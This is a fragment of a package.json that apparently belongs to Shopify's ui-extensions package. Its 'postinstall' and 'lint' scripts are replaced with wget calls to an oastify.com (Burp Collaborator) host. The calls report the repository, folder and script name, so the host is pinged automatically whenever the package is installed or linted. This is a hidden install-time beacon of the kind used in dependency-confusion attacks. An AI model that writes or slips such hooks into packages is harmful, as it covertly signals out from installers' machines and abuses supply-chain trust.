    "postinstall": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/ui-extensions\\&folder=admin-ui-extensions\\&postinstall",
    "lint": "wget http://moti.pjcahdqp5ghes1m7oe7qcxodr4x5lx9m.oastify.com/test?repository=https://github.com/Shopify/ui-extensions\\&folder=admin-ui-extensions\\&lint"
  }
}